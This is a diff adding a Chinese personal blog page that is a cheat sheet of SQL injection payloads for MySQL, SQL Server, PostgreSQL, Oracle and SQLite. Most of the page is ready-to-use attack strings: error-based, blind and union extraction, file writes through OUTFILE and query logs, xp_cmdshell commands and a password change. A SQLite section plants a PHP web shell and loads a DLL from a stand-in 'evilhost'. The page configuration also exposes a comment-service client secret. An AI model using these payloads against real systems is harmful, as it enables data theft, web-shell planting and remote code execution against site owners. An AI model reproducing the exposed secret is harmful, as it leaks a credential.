@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="seconme">
+    
+    <title>
+        
+            SQL注入Payload |
+        
+        ~是我呀
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"seconme.github.io","root":"/","language":"zh-CN"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/preview.webp","favicon":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/favicon.3t5ap34gepy0.webp","avatar":"https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Lifetime Wandering","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":true},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"seconme","github_admins":null,"repository":"hexo-blog-comments","client_id":"17efb64209824b16935b","client_secret":"2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气门徒","筑基弟子","金丹砥柱","元婴长老","化神门主","合道老祖","终于大乘"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/preview.webp">
+                </a>
+            
+            <a class="logo-title" href="/">
+               ~是我呀
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">SQL注入Payload</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://cdn.staticaly.com/gh/seconme/picx-images-hosting@master/preview.1lbmi81cp8u8.webp">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">seconme</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-05-05 13:00:56</span>
+        <span class="mobile">2023-05-05 13:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-05-05 22:15:50</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>5 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="数据库相关信息"><a href="#数据库相关信息" class="headerlink" title="数据库相关信息"></a>数据库相关信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@VERSION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">system_user</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_role</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> mysql.user</span><br><span class="line"><span class="keyword">SELECT</span> database()</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>        # 获取数据存储路径</span><br></pre></td></tr></table></figure>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML"></a>UPDATEXML</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="built_in">substring</span>((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">10</span>,<span class="number">20</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="EXTRACTVALUE"><a href="#EXTRACTVALUE" class="headerlink" title="EXTRACTVALUE"></a>EXTRACTVALUE</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="built_in">substring</span>((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">10</span>,<span class="number">20</span>)),<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="FLOOR-RAND-0-2"><a href="#FLOOR-RAND-0-2" class="headerlink" title="FLOOR(RAND(0)*2)"></a>FLOOR(RAND(0)*2)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 这是从SQLMap一次测试中复制过来的验证漏洞是否存在的语句</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">3374</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">count</span>(<span class="number">0x716b766271</span>,(<span class="keyword">select</span> (elt(<span class="number">3374</span><span class="operator">=</span><span class="number">3374</span>,<span class="number">1</span>))),<span class="number">0x7170717871</span>,<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.plugins <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">-- qOYJ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">3374</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">count</span>(<span class="number">0x716b766271</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">-- qOYJ</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Blind-注入"><a href="#Blind-注入" class="headerlink" title="Blind 注入"></a>Blind 注入</h2><p>推荐使用工具。如果确定可以盲注。</p>
+<h3 id="boolean-based"><a href="#boolean-based" class="headerlink" title="boolean-based"></a>boolean-based</h3><p>常用函数：<br>LEFT、SUBSTRING、RIGHT</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 从SQLMap一次测试中摘过来的</span><br><span class="line">RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">6316</span><span class="operator">=</span><span class="number">6316</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))<span class="comment">-- vBBq</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 一般手测</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> database()),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span> <span class="comment">-- +</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">substring</span>((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0</span>,<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;ct&#x27;</span>  <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="time-based"><a href="#time-based" class="headerlink" title="time-based"></a>time-based</h3><p>时间盲注 SLEEP 函数被过滤的替代方案就是使用大运算函数，使后台运算时间加长，从而达到和SLEEP相似的效果。如 <code>SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># SQLMap，仅初步测试是否存在漏洞</span><br><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">2469</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))sLxx)<span class="comment">-- fvNE</span></span><br><span class="line"></span><br><span class="line"># 手测</span><br><span class="line"><span class="keyword">and</span> if <span class="keyword">left</span>((<span class="keyword">select</span> database()),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span> sleep(<span class="number">5</span>) <span class="comment">-- +</span></span><br><span class="line"># Benchmark 函数</span><br><span class="line"><span class="keyword">SELECT</span> BENCHMARK(<span class="number">1000000</span>,MD5(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="keyword">SELECT</span> BENCHMARK(<span class="number">1000000</span>,MD5((<span class="keyword">SELECT</span> DATABASE())))</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Union-Injection"><a href="#Union-Injection" class="headerlink" title="Union Injection"></a>Union Injection</h2><ul>
+<li>UNION SELECT</li>
+<li>UNION ALL SELECT <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">-- +</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> GROUP_CONCAT(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>tableName <span class="comment">-- +</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="其他常用语句"><a href="#其他常用语句" class="headerlink" title="其他常用语句"></a>其他常用语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 使用注释</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1312</span> <span class="comment">-- comment</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">753</span> # comment</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/*comment*/</span><span class="number">1</span>  # 注释代替空格</span><br><span class="line"></span><br><span class="line"># 空格替代</span><br><span class="line"><span class="number">0x9</span> <span class="number">0xa</span><span class="number">-0xd</span> <span class="number">0x20</span> <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line"># 使用十六进制代替字符串</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x414243</span> （ABC）</span><br><span class="line"></span><br><span class="line"># 使用ascii函数：读取出数据的ASCII码值和<span class="number">32</span>相同吗</span><br><span class="line">ascii(<span class="built_in">substring</span>((<span class="keyword">SELECT</span> DATABASE()),Start_Position,read_length)) <span class="operator">&amp;</span> <span class="number">32</span> <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><ul>
+<li>基于 into 写文件<ul>
+<li>union select 1,1,1 into outfile ‘&#x2F;tmp&#x2F;demo.txt’ </li>
+<li>union select 1,1,1 into dumpfile ‘&#x2F;tmp&#x2F;demo.txt’<br>dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</li>
+</ul>
+</li>
+<li>基于 log 写文件<ul>
+<li>show variables like ‘%general%’; </li>
+<li>set global general_log &#x3D; on; </li>
+<li>set global general_log_file &#x3D; ‘&#x2F;path&#x2F;to&#x2F;file’; select ‘<?php var_dump("test");?>‘; </li>
+<li>set global general_log_file &#x3D; ‘&#x2F;original&#x2F;path’; </li>
+<li>set global general_log &#x3D; off;</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>这后面的日后做个总结，现在SQL注入不好搞呀。</p>
+</blockquote>
+<h1 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h1><ul>
+<li><p>Version</p>
+<ul>
+<li>SELECT @@version</li>
+<li>SELECT SERVERPROPERTY(‘Edition’);</li>
+<li>SELECT SERVERPROPERTY(‘EngineEdition’);</li>
+</ul>
+</li>
+<li><p>Comment</p>
+<ul>
+<li>SELECT 1 – comment</li>
+<li>SELECT &#x2F;<em>comment</em>&#x2F;1</li>
+</ul>
+</li>
+<li><p>Space</p>
+<ul>
+<li>0x01 - 0x20</li>
+</ul>
+</li>
+<li><p>用户信息</p>
+<ul>
+<li>SELECT user_name()</li>
+<li>SELECT system_user</li>
+<li>SELECT user</li>
+<li>SELECT loginame FROM master..sysprocesses WHERE spid &#x3D; @@SPID</li>
+</ul>
+</li>
+<li><p>用户权限</p>
+<ul>
+<li>select IS_SRVROLEMEMBER(‘sysadmin’)</li>
+<li>select IS_SRVROLEMEMBER(‘db_owner’)</li>
+</ul>
+</li>
+<li><p>List User</p>
+<ul>
+<li>SELECT name FROM master..syslogins</li>
+</ul>
+</li>
+<li><p>数据库信息</p>
+<ul>
+<li>SELECT name FROM master..sysdatabases</li>
+<li>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</li>
+<li>select quotename(name) from master..sysdatabases FOR XML PATH(‘’)</li>
+</ul>
+</li>
+<li><p>执行命令</p>
+<ul>
+<li>EXEC xp_cmdshell ‘net user’</li>
+</ul>
+</li>
+<li><p>Ascii</p>
+<ul>
+<li>SELECT char(0x41)</li>
+<li>SELECT ascii(‘A’)</li>
+<li>SELECT char(65)+char(66) &#x3D;&gt; return AB</li>
+</ul>
+</li>
+<li><p>Delay</p>
+<ul>
+<li>WAITFOR DELAY ‘0:0:3’ pause for 3 seconds</li>
+</ul>
+</li>
+<li><p>Change Password</p>
+<ul>
+<li>ALTER LOGIN [sa] WITH PASSWORD&#x3D;N’NewPassword’</li>
+</ul>
+</li>
+<li><p>Trick</p>
+<ul>
+<li>id&#x3D;1 union:select password from:user</li>
+</ul>
+</li>
+<li><p>文件读取</p>
+<ul>
+<li>OpenRowset</li>
+</ul>
+</li>
+<li><p>当前查询语句</p>
+<ul>
+<li>select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</li>
+</ul>
+</li>
+<li><p>hostname</p>
+<ul>
+<li>用于判断是否站库分离</li>
+<li>select host_name()</li>
+<li>exec xp_getnetname</li>
+</ul>
+</li>
+<li><p>服务器信息</p>
+<ul>
+<li>exec xp_msver</li>
+</ul>
+</li>
+<li><p>系统配置</p>
+<ul>
+<li>select * from sys.configurations;</li>
+</ul>
+</li>
+<li><p>注册表读写</p>
+<ul>
+<li>xp_regread<br>■ exec xp_regread N’HKEY_LOCAL_MACHINE’, N’SYSTEM\CurrentControlSet\Services\MSSEARCH’</li>
+<li>xp_regwrite</li>
+<li>xp_regdeletvalue</li>
+<li>xp_regdeletkey</li>
+<li>xp_regaddmultistring</li>
+</ul>
+</li>
+<li><p>报错注入</p>
+</li>
+<li><p>1&#x3D;convert(int,(db_name()))</p>
+</li>
+<li><p>AND (select db_name())&#x3D;1</p>
+</li>
+<li><p>常用函数</p>
+<ul>
+<li>SUSER_NAME()</li>
+<li>USER_NAME()</li>
+<li>PERMISSIONS()</li>
+<li>DB_NAME()</li>
+<li>FILE_NAME()</li>
+<li>TYPE_NAME()</li>
+<li>COL_NAME()</li>
+</ul>
+</li>
+<li><p>DNS OOB</p>
+<ul>
+<li>fn_xe_file_target_read_file</li>
+<li>fn_get_audit_file</li>
+<li>fn_trace_gettable</li>
+</ul>
+</li>
+<li><p>其他常用存储过程</p>
+<ul>
+<li>sp_execute_external_script</li>
+<li>sp_makewebtask</li>
+<li>sp_OACreate</li>
+<li>sp_OADestroy</li>
+<li>sp_OAGetErrorInfo</li>
+<li>sp_OAGetProperty</li>
+<li>sp_OAMethod</li>
+<li>sp_OASetProperty</li>
+<li>sp_OAStop</li>
+<li>xp_cmdshell</li>
+<li>xp_dirtree</li>
+<li>xp_enumerrorlogs</li>
+<li>xp_enumgroups</li>
+<li>xp_fixeddrives</li>
+<li>xp_getfiledetails</li>
+<li>xp_loginconfig</li>
+</ul>
+</li>
+</ul>
+<h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><ul>
+<li>Version<ul>
+<li>SELECT version()</li>
+</ul>
+</li>
+<li>Comment<ul>
+<li>SELECT 1 – comment</li>
+<li>SELECT &#x2F;<em>comment</em>&#x2F;1</li>
+</ul>
+</li>
+<li>Current User<ul>
+<li>SELECT user</li>
+<li>SELECT current_user</li>
+<li>SELECT session_user</li>
+<li>SELECT getpgusername()</li>
+</ul>
+</li>
+<li>List User<ul>
+<li>SELECT usename FROM pg_user</li>
+</ul>
+</li>
+<li>Current Database<ul>
+<li>SELECT current_database()</li>
+</ul>
+</li>
+<li>List Database<ul>
+<li>SELECT datname FROM pg_database</li>
+</ul>
+</li>
+<li>Ascii<ul>
+<li>SELECT char(0x41)</li>
+<li>SELECT ascii(‘A’)</li>
+</ul>
+</li>
+<li>Delay<ul>
+<li>pg_sleep(1)</li>
+</ul>
+</li>
+</ul>
+<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><ul>
+<li>dump<ul>
+<li>select * from v$tablespace;</li>
+<li>select * from user_tables;</li>
+<li>select column_name from user_tab_columns where table_name &#x3D; ‘table_name’;</li>
+<li>select column_name, data_type from user_tab_columns where table_name &#x3D; ‘table_name’;</li>
+<li>SELECT * FROM ALL_TABLES</li>
+</ul>
+</li>
+<li>Comment<hr>
+<ul>
+<li>&#x2F;**&#x2F;</li>
+</ul>
+</li>
+<li>Space<ul>
+<li>0x00 0x09 0xa-0xd 0x20</li>
+</ul>
+</li>
+<li>报错<ul>
+<li>utl_inaddr.get_host_name</li>
+<li>ctxsys.drithsx.sn</li>
+<li>ctxsys.CTX_REPORT.TOKEN_TYPE</li>
+<li>XMLType</li>
+<li>dbms_xdb_version.checkin</li>
+<li>dbms_xdb_version.makeversioned</li>
+<li>dbms_xdb_version.uncheckout</li>
+<li>dbms_utility.sqlid_to_sqlhash</li>
+<li>ordsys.ord_dicom.getmappingxpath</li>
+<li>utl_inaddr.get_host_name</li>
+<li>utl_inaddr.get_host_address</li>
+</ul>
+</li>
+<li>OOB<ul>
+<li>utl_http.request</li>
+<li>utl_inaddr.get_host_address</li>
+<li>SYS.DBMS_LDAP.INIT</li>
+<li>HTTPURITYPE</li>
+<li>HTTP_URITYPE.GETCLOB</li>
+</ul>
+</li>
+<li>绕过<ul>
+<li>rawtohex</li>
+</ul>
+</li>
+<li>写文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace directory TEST_DIR <span class="keyword">as</span> <span class="string">&#x27;/path/to/dir&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> read, write <span class="keyword">on</span> directory TEST_DIR <span class="keyword">to</span> <span class="keyword">system</span>;</span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">   isto_file utl_file.file_type;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   isto_file :<span class="operator">=</span> utl_file.fopen(<span class="string">&#x27;TEST_DIR&#x27;</span>, <span class="string">&#x27;test.jsp&#x27;</span>, <span class="string">&#x27;W&#x27;</span>);</span><br><span class="line">   utl_file.put_line(isto_file, <span class="string">&#x27;&lt;% out.println(&quot;test&quot;); %&gt;&#x27;</span>);</span><br><span class="line">   utl_file.fflush(isto_file);</span><br><span class="line">   utl_file.fclose(isto_file);</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h1><ul>
+<li>Comment:<br> <code>- --</code> , <code>/**/</code></li>
+<li>Version<ul>
+<li>select sqlite_version();</li>
+</ul>
+</li>
+<li>Command Execution<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE <span class="string">&#x27;/var/www/lol.php&#x27;</span> <span class="keyword">AS</span> lol; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> lol.pwn (dataz text);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> lol.pwn (dataz) <span class="keyword">VALUES</span> (<span class="string">&#x27;&lt;?system($_GET[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span>);<span class="comment">-- </span></span><br></pre></td></tr></table></figure></li>
+<li>Load_extension<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,load_extension(<span class="string">&#x27;\\evilhost\evil.dll&#x27;</span>,<span class="string">&#x27;E&#x27;</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h1>
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">SQL注入Payload</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">seconme</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-05-05 13:00:56</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/05/05/SQL注入Payload/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">#SQL注入</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/05/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">信息收集</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
